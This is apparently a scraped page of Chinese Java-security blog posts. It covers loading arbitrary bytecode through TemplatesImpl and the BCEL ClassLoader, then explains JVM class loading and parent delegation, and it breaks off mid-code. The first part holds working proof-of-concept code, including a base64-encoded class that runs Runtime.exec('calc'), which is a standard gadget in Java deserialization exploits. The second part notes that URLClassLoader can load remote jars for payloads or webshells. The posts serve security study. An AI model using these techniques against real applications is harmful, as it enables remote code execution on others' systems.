9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 对于第三个： （1）在newTransformer()方法中： TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//进入下一个方法并不需要条件继续，这里就直接诶调用get （2）在 getTransletInstance()方法中： if (_name == null) return null; if (_class == null) defineTransletClasses(); //这里要求_name不能为null，_class需要为null然后继续跟进 （3）在 defineTransletClasses() 方法中 if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); }//_bytecodes不能为null TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());//_tfactory需要赋值为TransformerFactoryImpl对象 } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); //在这里调用了defineClass方法 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 现在来总结一下上面遇到的变量\n1 2 3 4 private String _name = null; private Class[] _class = null; private byte[][] _bytecodes = null; private transient TransformerFactoryImpl _tfactory = null; 这里可以看到这些变量都是私有类，而且没有构造方法，所以只能用反射获取改值。所以最终可以这样构造:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;xxxx\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } 但是现在又遇到一个问题，就算成功加载了Class对象，这里并不能直接调用构造函数，即没有初始化，这样并不能利用我们自己构造的代码，那么该如何解决，继续看代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } 可以看到代码后半部分实例化了一个对象给translet，并且最后返回的也是translet，所以还是这里的newInstance()有用（重点，就是利用这个构造方法来实例化对象时来利用，这也是为什么将恶意代码设置在构造方法中），所以要确保进入defineTransletClasses()并不会报错，现在继续来看defineTransletClasses()方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//这里要求_transletIndex不能小于0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 在这个代码中，虽然我们在前面为了符合条件将_class赋值为了null，但是在defineTransletClasses()方法中重新对这个_class赋值了：\n这里不多说。后面就懂了。然后看下面这部分代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) {//这里要求_transletIndex不能小于0 ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } 这里_transletIndex不能小于0，并且在前面可以看到赋值语句：\n1 _transletIndex = i; 这里刚好与前面的_class[_transletIndex]相对应，并且什么，前面的代码逻辑也完全符合，如下：\n也就是说先调用了defineTransletClasses()方法，让_class不再为null，所以可以有值。\n也就是可以理解为只要条件满足，_bytecodes对应的代码都会传给_class[i]，也就是_class[_transletIndex],然后就会再对这个类进行实例化，这样就可以成功运行。现在来看给这个赋值的if的条件语句，如下：\n1 2 3 4 5 6 if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } 再看 _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); 所以这里就需要_bytecodes[i]的父类需要为AbstractTranslet才行\n1 2 private static String ABSTRACT_TRANSLET = \u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; 所以使用的POC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { public Test() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 这里为什么要多两个transform方法，原因如下;\n1 2 3 4 5 这里是因为子类需要实现父类里面的抽象方法，同时因为父类是抽象类，可能没有将接口的方法全部实现， 这时子类如果不是抽象的，那必须将其他接口方法都实现。 这里面 transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) 是父类里面的抽象方法所以要重写 transform(DOM document, SerializationHandler[] handlers)是父类没有实现接口的方法所以要重写 最终的POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { byte[] bytecodes = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAWTGphdmFfZm91bmRhdGlvbi9UZXh0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAmAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAJVGV4dC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAFGphdmFfZm91bmRhdGlvbi9UZXh0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAACgAEAAsADQAMAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAADwALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAA4AAAAEAAEAFgABABAAFwACAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAEgALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABgAGQACAAAAAQAaABsAAwAOAAAABAABABYAAQAcAAAAAgAd\u0026#34;); TemplatesImpl mpl =new TemplatesImpl(); setFieldValue(mpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(mpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{bytecodes}); setFieldValue(mpl,\u0026#34;_class\u0026#34;,null); setFieldValue(mpl,\u0026#34;_tfactory\u0026#34;,new TransformerFactoryImpl()); mpl.newTransformer(); } public static void setFieldValue(Object mpl,String name,Object value) throws Exception { Field field = mpl.getClass().getDeclaredField(name); field.setAccessible(true); field.set(mpl,value); } } 虽然报错，但是成功弹出计算机：\n报错是正常的，因为本来构造出来的动态加载字节码就会导致原有逻辑被破坏，所以是肯定会报错的。但达到了最终目的。\n那么现在我们来尝试一下利用那个public修饰符的方法，即getTransletIndex，代码如下：\n1 2 3 4 5 6 7 8 9 public synchronized int getTransletIndex() { try { if (_class == null) defineTransletClasses(); } catch (TransformerConfigurationException e) { // Falls through } return _transletIndex; } 这里也是只需要_class变量为null即可，现在就继续跟defineTransletClasses()，但是这里就有个问题，无法实例化，这也是为什么没有利用到这个的原因。\n继续思考，是私有方法，为什么不直接使用反射来获取，因为TemplatesImpl类有一个无参的公共的构造方法，尝试构造一下\n弹计算机代码不变，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Text extends AbstractTranslet { public Text() throws IOException { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.java变为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 //对象+getClass() package java_foundation; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\java_foundation\\\\Text.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); Method method = ctf.getClass().getDeclaredMethod(\u0026#34;getTransletInstance\u0026#34;); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); method.setAccessible(true); method.invoke(ctf);//但是其实在根本上没有变化，都是在getTransletInstance方法这里实例化，没办法，只有这里接收到了defineClass()返回的类，这里才能实例化 } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 其他就不多说了。\n利用BCEL ClassLoader加载字节码 关于BCEL可以先看看P神的文章：https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html#0x01-bcel\n在Java 8u251的更新中，这个ClassLoader被移除了，简单了解一下。这里用JDK7看一下\n——————————————\nBCEL全名是Apache Commoms BCEL，属于Apache Commoms项目下的一个子项目。\nBCEL库提供了一系列用于分析、创建、修改Java Class文件的API。它很特殊的点在它被包含在了原生的JDK中，位于com.sun.org.apache.bcel中。\nBCEL包中有个有趣的类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个ClassLoader，但是他重写了Java内置的ClassLoader#loadClass()方法，去看一下源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException { Class cl = null; /* First try: lookup hash table. */ if((cl=(Class)classes.get(class_name)) == null) { /* Second try: Load system class using system class loader. You better * don\u0026#39;t mess around with them. */ for(int i=0; i \u0026lt; ignored_packages.length; i++) { if(class_name.startsWith(ignored_packages[i])) { cl = deferTo.loadClass(class_name); break; } } if(cl == null) { JavaClass clazz = null; /* Third try: Special request? */ if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); else { // Fourth try: Load classes via repository if ((clazz = repository.loadClass(class_name)) != null) { clazz = modifyClass(clazz); } else throw new ClassNotFoundException(class_name); } if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//这里调用了defineClass方法 } else // Fourth try: Use default class loader cl = Class.forName(class_name); } if(resolve) resolveClass(cl); } classes.put(class_name, cl); return cl; } 其中调用的是defineClass()方法\n1 2 3 4 if(clazz != null) { byte[] bytes = clazz.getBytes(); cl = defineClass(class_name, bytes, 0, bytes.length);//这里调用了defineClass方法 } 看代码，这里就需要需要BCEL字节码的开头为$$BCEL$$，用createClass方法获取类的Class对象从而可以赋值给clazz。\n1 2 if(class_name.indexOf(\u0026#34;$$BCEL$$\u0026#34;) \u0026gt;= 0) clazz = createClass(class_name); 简单梳理一下过程，首先就是设置cl为null\n然后在下面这个条件语句判断开头有没有这个东西，如果有，就使用createClass()方法来对象并赋值给clazz，具体实现可以自己去看源代码（在createClass方法内就已经将BCEL形式的字节码转换成JavaClass对象了）\n此时clazz不为null，那么就会进入到下面这个语句\n这里就会调用到defeineClass()方法了，再在这里面得到类的Class字节码，最终获得类对象cl并return了回去。\n流程已经基本清楚，那么如何利用呢，如下：\n在BCEL中，它提供了Utility和Repository类\n其中Repository提供了lookupClass方法用于加载一个类\nUtility类提供了一个encode方法用于将JavaClass对象转换成BCEL形式的字节码\n1 String code = Utility.encode(clazz.getBytes(), true); 再用BCEL ClassLoader进行加载\n1 new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance();//这里就是简单的实例化对象后的对一个函数的调用 整合一下，我们可以这样利用\n编写恶意类：\n1 2 3 4 5 6 //Test.java public class Test{ static { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class Main { public static void main(String[] args) throws Exception { JavaClass clazz = Repository.lookupClass(Test.class); String code = Utility.encode(clazz.getBytes(), true); System.out.println(code); new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance(); } } 成功弹出计算机：\n代码为什么要这样构造其实已经比较清楚了，可以自己想想流程来对比一下。\n还有的就是这里JDK7运行需要改idea的配置，为了能测试成功改了，但是后面又改回来了，刚好防止自己忘，可以参考文章来改：https://blog.csdn.net/weixin_46001244/article/details/108601584\n","date":"2024-06-23T21:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","title":"动态加载字节码"},{"content":"Java类加载机制 JVM（java虚拟机）把描述类的数据从Class文件加载到内存，并对数据进行校验、解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的类加载机制。\nJava类 Java是编译型语言，我们编写的java文件需要被编译成class文件后才能被JVM运行，这里先了解一下java类。\n给一个Main.java，内容如下：\n1 2 3 4 5 public class Main{ public static void main(String[] args){ System.out.println(\u0026#34;haha\u0026#34;); } } 使用javac命令将其编译为字节代码的class文件，结果如下：\n这样就生成了一个字节码文件 ，用十六进制工具打开看一下\n这里就可以看到生成的字节码，我们可以通过JDK自带的javap命令反汇编Main.class文件对应的Main类，\nJVM在执行Main之前会先解析class二进制内容，JVM执行的其实就是如上javap命令生成的字节码。\n类加载的时机 （具体可参考《深入理解Java虚拟机》一书）\n类加载过程如下表示：\n其中 从验证到解析 为连接， 从加载到初始化 为类加载\n加载 加载过程：\n通过类的全限定名（包名+类名）来获取定义此类的二进制字节流 将这个字节流所代表的静态存储结构转化为运行时的数据结果 在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口 校验 这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。从整体上看，验证阶段大致上会完成4个阶段的校验工作：文件格式、元数据、字节码、符号引用。可以通过设置参数略过。\n准备 准备阶段是正式为类中定义的变量（即静态变量\u0026ndash;被static修饰的变量）分配内存并设置类变量初始值的阶段。\n这里需要注意的点：\n此时进行内存分配的仅包括类变量（静态变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在Java堆中。 也就是说类变量随着类的加载为存在于方法区\n其次就是这里说的初始值“通常情况”下是数据类型的零值，比如如下代码： public satic int value = 123;，在准备阶段过后的初始值为0而不是123。把value赋值为123的指令在初始化阶段才会被执行。\n但是在一些特殊情况，如果类变量同时被static和final修饰，比如：\npublic static final int value = 123;\n那么在准备阶段虚拟机就会将value赋值为123，并且在定义这个变量的时候必须为其显式的赋值。\n解析 解析阶段是Java虚拟机将常量池内的符号引用替换为直接引用的过程\n符号引用就是一组符号来描述目标，可以是任何字面量。 直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。 初始化 执行类构造器\u0026lt;clinit\u0026gt;()方法的过程\n会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法（defineClass0/1/2）来定义一个java.lang.Class 实例\n其中包括：\n执行static语句块中的语句 完成static属性的赋值操作 当类的直接父类还没有被初始化，则先初始化其直接父类 ClassLoader类加载器分类 一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。\n类加载器类型包括四种，分别如下：\nBootstrap ClassLoader（启动类加载器）：最顶层的类加载器，主要加载核心类库。这个类加载器负责加载存放在 jre\\lib 目录下的部分jar包（如rt.jar、tools.jar）或者被-Xbootclasspath 参数所指定的路径中存放的类库。 Extension ClassLoader（扩展类加载器）：这个加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载 jre\\lib\\ext 目录中的，或者被 java.ext.dirs 系统变量所指定的路径中的所有类库 Application ClassLoader（系统类加载器）：这个类加载器由 sun.misc.Launcher$AppClassLoader 实现。它负责加载用户类路径（ClassPath）上所指定的类库。需要注意的是如果应用程序中没有自定义自己的类加载器，一般情况下AppClassLoader是默认的类加载器。 用户自定义加载器 在Java虚拟机角度来看，存在两种不同的类加载器：\n一种是启动类加载器，这个加载器使用C++语言实现，是虚拟机自身的一部分。所以当使用getClassLoader()方法时会返回null（后面会说）\n还有一种是其他所有的类加载器，这些类加载器都由Java语言实现，独立存在于虚拟机外部，并且全都继承自抽象类 java.lang.ClassLoader。\n获取类加载器的方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception { // 获取 Test 类的类加载器 ClassLoader testClassLoader = Class.forName(\u0026#34;Test\u0026#34;).getClassLoader(); System.out.println(\u0026#34;Test 类的类加载器: \u0026#34; + testClassLoader); // 获取当前类的类加载器 ClassLoader currentClassLoader = Main.class.getClassLoader(); System.out.println(\u0026#34;Main 类的类加载器: \u0026#34; + currentClassLoader); // 获取系统类加载器 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); System.out.println(\u0026#34;系统类加载器: \u0026#34; + systemClassLoader); } } /* Output: Test 类的类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2 Main 类的类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2 系统类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2 双亲委派模型 双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。注意这里的父子关系一般不是以继承关系实现，只是通过使用组合关系来复用父加载器的代码。\n双亲委派模型的工作流程图\n即如果一个类加载器收到了类加载的请求，它不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一层次的加载器都是如此，直到传送到最顶层的启动类加载器，只有当父加载器反馈自己无法完成这个加载请求的时候（即它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。\n双亲委派模型的优点：\n1、这样就是能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。\n2、保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。\n双亲委派模型实现代码\n这段代码的逻辑就是先检查请求加载的类型是否被加载过，如果没有就调用父加载器的loadClass() 方法，若父加载器为空则默认使用启动类加载器为父加载器。假如父加载器加载失败，才调用自己的findClass()方法加载。\n最后通过上述步骤我们找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。\n类加载器核心方法 loadClass：加载指定的Java类\nfindClass：查找指定的Java类\nfindLoadedClass：查找JVM已经加载过的类\ndefineClass：定义一个Java类\nresolveClass：链接指定的Java类\n类加载的方式 命令行启动应用时由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载。 通过Class.forName方法动态加载会执行类中的static块，而ClassLoader.loadClass()方法动态加载不会执行\n在前面反射的学习中也是说明了可以利用classloader来加载类，在这里利用加载器获取Class对象的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ //加载类的Class对象： Class clazz = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); Method method = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(\u0026#34;hello \u0026#34;+method.invoke(clazz.newInstance(),null)); } } //hello fupanc 可以看到可以正常获取到类的Class对象并且调用它。\n调试类加载过程 测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception{ ClassLoader classLoader = ClassLoader.getSystemClassLoader(); //加载类 Class clazz = classLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); } } 打断点后调试：\n得到当前类加载器为系统类加载器，然后强制步入loadClass()方法，进入到了ClassLoader类的loadClass()方法。在这个laodClass()方法中会调用另外一个重载的loadClass()方法：\n简单注意一下这个参数传递，看看后面有没有用。继续跟进这个loadClass()方法,但是由于jdk自带的包中有些文件是反编译的.class文件，反编译的代码有一些不是很准确，所以这里需要将其转换为.java文件，具体就看参考文章，这里不多说。\n然后继续调试，步入后发现到达了Launcher类的loadClass()方法：\n这样就可以看出来这里的调用逻辑，不多说，再往后面看，这里的ucp.knownToNotExist(name)为false，所以会直接调用到后面的代码，如下：\n这里的super是系统类加载器，也就是说这里调用了类加载器来加载类：\n现在就到了ClassLoader类的loadClass()方法： 这里的逻辑还是比较好看，首先这里的synchronized是Java提供的同步机制，用于保证多线程访问共享资源时的线程安全，而在getClassLoadingLock(name) 方法返回一个用于加载类的锁对象，所以这的目的就是为每个类的加载过程提供独立的锁，防止多个线程同时加载同一个类。\n然后现在来看方法内部的代码，首先就是看JVM中是否加载过这个类，这里为null，也就是没有加载过。然后进入了if语句：\n这里检测到了系统类加载器有父加载器Extension ClassLoader（扩展类加载器）。\n然后就调用类ExtClassLoader类加载器的loadClass()方法（同样是ClassLoader类的loadClass()方法）：\n但是这里的parent为null，也算符合预期，因为扩展类加载器本来就没有父加载器。\n然后就会进入else语句，其实这个findBootstrapClassOrNull()方法就是看怎么进行的，跟进这个方法：\n但是这个findBootstrapClass(name)执行后还是为Null，回退到loadClass()方法：\n后面就会进入这个if条件，然后调用扩展类加载器来调用findClass()方法来查找类：\n可以看到这个方法中有defineClass()方法，但是这里并没有进入这个条件，大概可以知道这里就是在调用扩展类加载器来查找，但是并没有找到，直接退出了。\n然后就退出到了前面AppClassLoader加载器的loadClass()方法：\n随后就会调用到AppClassLoader类加载器的findClass()方法：\n这里应该是因为异常退出导致c直接被设置为null。\n然后跟进这里的findClass()方法:\n可以看到最后返回这个result，这个result就是我们想要寻找的类。并且这里是在这个方法内部声明的result，所以这个找类的操作必然是中间的那个赋值操作完成的，调试一下，确实是调用的defineClass()方法来定义的类：\n最后是找到了这个了类:\n然后回到loadClass()方法，最后是直接返回了这个Reflection类：\n然后一直返回，成功得到了这个Refelction类的Class对象：\nOK。调试结束。大概过程梳理下来确实比较符合双亲委派机制，先是AppClassLoader，然后是ExtClassLoader，然后是启动类加载器，启动类加载器找不到然后再委派给子加载器加载，最后在系统类加载器找到想要加载的类。\n————\n现在我们来看一下sun.misc.Launcher类，并且在调试过程中都是进入了这个Launcher类的，简单看一下源码，可以发现这个类里面有常用的类加载器的源码，看下面这两个代码：\n1 2 3 static class AppClassLoader extends URLClassLoader{} static class ExtClassLoader extends URLClassLoader{} 看一下URLClassLoader\n1 public class URLClassLoader extends SecureClassLoader implements Closeable{} SecureClassLoader\n1 public class SecureClassLoader extends ClassLoader{} 从这些代码片段可以看出上面介绍的类加载器在使用时为什么不是继承关系，而是组合关系，叫作父加载器是为了更好学习。\n继承图如下：\nURLClassLoader URLClassLoader 继承了 ClassLoader，从名字就可以看出来，URLClassLoader 提供了加载远程资源的能力，在写漏洞利用的 payload 或者 webshell 的时候我们可以使用这个特性来加载远程的 jar 来实现远程的类方法调用。\n首先声明一点，对于class文件是否要有软件包声明问题，报错的话有两种解决方法：\nclass文件不要软件包 调用loadClass()方法加载时加上软件包即可，如 java_foundation.Reflection ——————\nMyTest.java：\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;调用了无参构造函数\u0026#34;); } } javac编译生成MyTest.class文件，再将其放在E盘。然后将当前项目中的所有MyTest.java文件删除，同时注意classpath中已编译的MyTest.class文件，也要删除，然后使用如下代码测试：\nMain.java文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void 